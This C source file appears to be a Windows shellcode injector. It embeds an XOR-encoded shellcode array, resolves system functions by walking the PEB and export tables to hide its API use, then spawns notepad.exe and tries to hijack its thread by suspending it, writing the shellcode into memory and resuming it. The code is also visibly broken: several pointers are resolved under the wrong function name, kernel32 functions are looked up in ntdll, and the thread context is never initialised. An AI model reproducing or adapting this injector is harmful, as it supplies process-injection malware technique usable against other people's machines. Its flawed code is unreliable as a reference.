#include <stdio.h>
#include "main.h"


#pragma comment(lib, "shlwapi.lib")
#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define STATUS_SUCCESS 0x00000000
#define TH32CS_SNAPPROCESS 0x00000002
#define TH32CS_SNAPTHREAD
#define THREAD_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | SPECIFIC_RIGHTS_ALL)


unsigned char buf[] =
"\xeb\x27\x5b\x53\x5f\xb0\xea\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xb8\x43\x74\x07\x80\x3e\xea\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x14\x01\xea\xff\x26\x4f\x52\x4b\xb1\x4d"
"\xfd\xba\x74\xe9\x56\x4d\x52\x4a\x8b\x12\x31\x13\x49\xeb"
"\xc6\x5c\xfe\xd2\x67\x95\x3e\x26\xfd\x60\x06\x94\x3f\x4d"
"\x74\xfe\xea\xf2\xfe\xf5\xe9\xc0\xfe\xeb\xfe\x15\x15\x4d"
"\xeb\x27\x5b\x53\x5f\xb0\x5c\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xe6\x5d\x74\x07\x80\x3e\x5c\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x14\x01\x5c\xff\x26\x4f\x52\x4b\xb1\xf6"
"\xfd\xba\x74\xe9\x56\x4d\x52\x4a\x8b\x12\x31\x13\x49\xeb"
"\xc6\x5c\xfe\xd2\x67\x95\x3e\x41\x75\x60\x06\x94\x3f\xf6"
"\x74\xfe\xea\xf2\xfe\xf5\xe9\xc0\xfe\xeb\xfe\x58\xe3\xb3"
"\x6a\x03\x1e\x07\xfd\x59\xb1\xf6\x38\xa5\x1a\x01\x1e\x06"
"\xc7\x5e\x7d\x5f\x05\xa7\x8a\x10\xb2\x9e\x2b\xd9\x72\x9e"
"\x55\x2c\x4a\xd8\x73\x59\x38\xb2\xa6\xbe\xb2\xb9\xa5\x8c"
"\xb2\xa7\xb2\xd6\x4c\x3d\xe4\x8d\x90\x89\x73\xd8\x3f\x78"
"\xb6\x2b\x94\x8f\x90\x88\x49\xd0\xf3\xd1\x8b\x29\x04\x9e"
"\x3c\x10\xa5\x57\xfc\x12\xb6\xa2\xc4\x56\xfd\xd8\xb6\x3c"
"\x28\x30\x3c\x37\x2b\x02\x3c\x29\x3c\x8e\xcd\x65\xbc\xd5"
"\xc8\xd1\x2b\x81\x67\x20\xee\x73\xcc\xd7\xc8\xd0\x11\x88"
"\xab\x89\xd3\x71\x5c\xc6\x64\x48\xfd\x0f\xa4\xf9\x43\xfa"
"\x9c\x0e\xa5\x81\xee\x64\x70\x68\x64\x6f\x73\x5a\x64\x71"
"\x64\x96\x94\x7d\xa4\xcd\xd0\xc9\x33\x89\x7f\x38\xf6\x6b"
"\xd4\xcf\xd0\xc8\x09\x90\xb3\x91\xcb\x69\x44\xde\x7c\x50"
"\xe5\x17\xbc\xab\x74\xe2\x84\x16\xbd\x89\xf6\x7c\x68\x70"
"\x7c\x77\x6b\x42\x7c\x69\x7c\xb5\x9c\x5e\x87\xee\xf3\xea"
"\x10\x40\x5c\x1b\xd5\x48\xf7\xec\xf3\xeb\x2a\xb3\x90\xb2"
"\xe8\x4a\x67\xfd\x5f\x73\xc6\x34\x9f\xba\x3d\xc1\xa7\x35"
"\x9e\x40\xd5\x5f\x4b\x53\x5f\x54\x48\x61\x5f\x4a\x5f\xb6"
"\x55\x5d\x84\xed\xf0\xe9\x13\x01\x5f\x18\xd6\x4b\xf4\xef"
"\xf0\xe8\x29\xb0\x93\xb1\xeb\x49\x64\xfe\x5c\x70\xc5\x37"
"\x9c\x98\x39\xc2\xa4\x36\x9d\x01\xd6\x5c\x48\x50\x5c\x57"
"\x4b\x62\x5c\x49\x5c\xa6\x14\x5a\xfb\x27\x57\x56\x4c\x59"
"\x4c\x4e\x7f\xa6\xb3\xa6\xf2\xf7\xf2\xf6\xe1\xee\x82\x74"
"\xd6\xee\x38\xf4\xd3\xee\x38\xf4\xab\xee\x38\xf4\x93\xf7"
"\xe5\xee\xbc\x11\xf9\xec\xfe\x97\x7a\xee\x38\xd4\xe3\xee"
"\x82\x66\x1f\x9a\xd2\xda\xb1\x8a\x93\xe7\x72\x6f\xbe\xe7"
"\xb2\x67\x51\x4b\xe1\xee\x38\xf4\x93\xe7\xe2\x2d\xf1\x9a"
"\xfb\xa7\x63\xc0\x32\xde\xab\xad\xb1\xa9\x36\xd4\xb3\xa6"
"\xb3\x2d\x33\x2e\xb3\xa6\xb3\xee\x36\x66\xc7\xc1\xfb\xa7"
"\x63\xf6\x38\xee\xab\xe2\x38\xe6\x93\xef\xb2\x76\x50\xf0"
"\xfb\x59\x7a\xeb\x82\x6f\xf2\x2d\x87\x2e\xfb\xa7\x65\xee"
"\x82\x66\x1f\xe7\x72\x6f\xbe\xe7\xb2\x67\x8b\x46\xc6\x57"
"\xff\xa5\xff\x82\xbb\xe3\x8a\x77\xc6\x7e\xeb\xe2\x38\xe6"
"\x97\xef\xb2\x76\xd5\xe7\x38\xaa\xfb\xe2\x38\xe6\xaf\xef"
"\xb2\x76\xf2\x2d\xb7\x2e\xf2\xfe\xfb\xa7\x63\xe7\xeb\xf8"
"\xea\xfc\xf2\xfe\xf2\xff\xf2\xfc\xfb\x25\x5f\x86\xf2\xf4"
"\x4c\x46\xeb\xe7\xea\xfc\xfb\x2d\xa1\x4f\xf8\x59\x4c\x59"
"\xee\x4e\xb8\xa6\xb3\xa6\xc6\xd5\xd6\xd4\x80\x94\x9d\xc2"
"\xdf\xca\xb3\xff\xf2\x1c\xff\xd1\x95\xa1\x4c\x73\xfa\x61"
"\x72\xa6\xb3\xa6\xb3\x4e\xb5\xa6\xb3\xa6\xdb\xc3\xdf\xca"
"\xdc\xa6\xe9\x4e\xb5\xa6\xb3\xa6\xdb\xc3\xdf\xca\xdc\xa6"
"\xf2\xfe\xfb\x97\x7a\xe7\x09\xe3\x30\xf0\xb4\x59\x66\xee"
"\x82\x6f\xf2\x1c\x43\x13\x11\xf0\x4c\x73\x8d\x2c\xaf\x28"
"\xbe\x61\xec\x56\x07\xa3\x8b\x40\x54\x60\xe6\x5d\x33\xe8"
"\xb8\x43";




size_t GetModHandle(wchar_t *ln) {
	PEB* pPeb = (PEB*)__readgsqword(0x60);
	PLIST_ENTRY header = &(pPeb->Ldr->InMemoryOrderModuleList);
	i("%p\n",pPeb);
	i("%p\n", header);



	for (PLIST_ENTRY curr = header->Flink; curr != header; curr = curr->Flink) {
		i("%p", curr);
		LDR_DATA_TABLE_ENTRY* data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		i("current node is: %ls\n", data->FullDllName.Buffer);

		if (StrStrIW(ln, data->FullDllName.Buffer)) {
			e("%ls is a match to %ls.", data->FullDllName.Buffer,ln);

			return data->DllBase;
		}
		else {
			e("%ls is not a match to %ls\n" , data->FullDllName.Buffer,ln);
		}


	}
	e("returning NULL value, failed to get dll");
	return 0;

}

size_t GetFuncAddr(size_t modb, char* fn) {

	PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(modb + dosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER opH = ntHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY data_Dir = opH.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(modb + data_Dir.VirtualAddress);

	i("Export Table: %p\n", exportTable);
	DWORD* arrf = (DWORD *)(modb + exportTable->AddressOfFunctions);
	DWORD* arrn = (DWORD*)(modb + exportTable->AddressOfNames);
	DWORD* arrno = (DWORD*)(modb + exportTable->AddressOfNameOrdinals);

	for (size_t i = 0; i < exportTable->NumberOfNames; i++) {
		char* name = (char*)(modb + arrn[i]);
		WORD numCAPIO = arrno[i] + 1;
		if (!stricmp(name, fn)) {
			g("Found ordinal %.4x - %s\n",numCAPIO, name);
			return modb + arrf[numCAPIO - 1];

		}

	}


	return 0;


}


void statchecker(NTSTATUS check){

	if(check == STATUS_SUCCESS){

		g("status success");
	}

}

int main(int argc, char** argv, char* envp) {
	size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
	g(" GetModHandle(ntdll.dll) = % p\n", kb);
	size_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");

	size_t ptr_CreateProcessA = (size_t)GetFuncAddr(mb, L"CreateProcessA");
	size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, L"CreateToolhelp32Snapshot");
	size_t ptr_Process32First = (size_t)GetFuncAddr(mb, L"Process32First");
	size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, L"Process32Next");
	size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, L"CloseHandle");


	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,L"NtOpenThread");
	size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb,L"NtWriteVirtualMemory");
	size_t ptr_NtSetContextThread = (size_t)GetFuncAddr(kb, L"NtSetContextThread");
	size_t ptr_NtResumeThread = (size_t)GetFuncAddr(kb, L"NtResumeThread");



	NTSTATUS status;
	STARTUPINFO si;
	HANDLE hThread;
	HANDLE hProc;
	OBJECT_ATTRIBUTES oa;
	DWORD pid;
	PVOID baseAddress = NULL;
	ULONG n;
	PROCESS_INFORMATION pi;
	PCONTEXT CTX;
	PROCESSENTRY32 dw;
	dw.dwSize = sizeof(dw);


	BOOL proc =((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)(L"C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
	if (proc == FALSE){
		e(" create process failed");

	}
	//HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);

	//if(((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32First)(snap, &dw)==TRUE){
	//	while  (((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32Next)(snap, &dw) == TRUE){

	//	if (stricmp(dw.szExeFile, "notepad.exe")== 0){
	//		pid == dw.th32ProcessID;
	//	}
	//}
	//}

	//((BOOL(WINAPI*)(HANDLE))ptr_CloseHandle)(snap);


	hProc = pi.hProcess;
	hThread = pi.hThread;

	status = ((NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG))ptr_NtOpenThread)(hThread, THREAD_ALL_ACCESS, &oa ,0);
	statchecker(status);

	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, &n);

	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, CTX);

	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hThread, &baseAddress, n,sizeof(buf),n,n);

	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hThread, &baseAddress, &buf, sizeof(buf), &n);

	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtSetContextThread)(hThread, CTX);

	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtResumeThread)(hThread, NULL);



	return 0;
}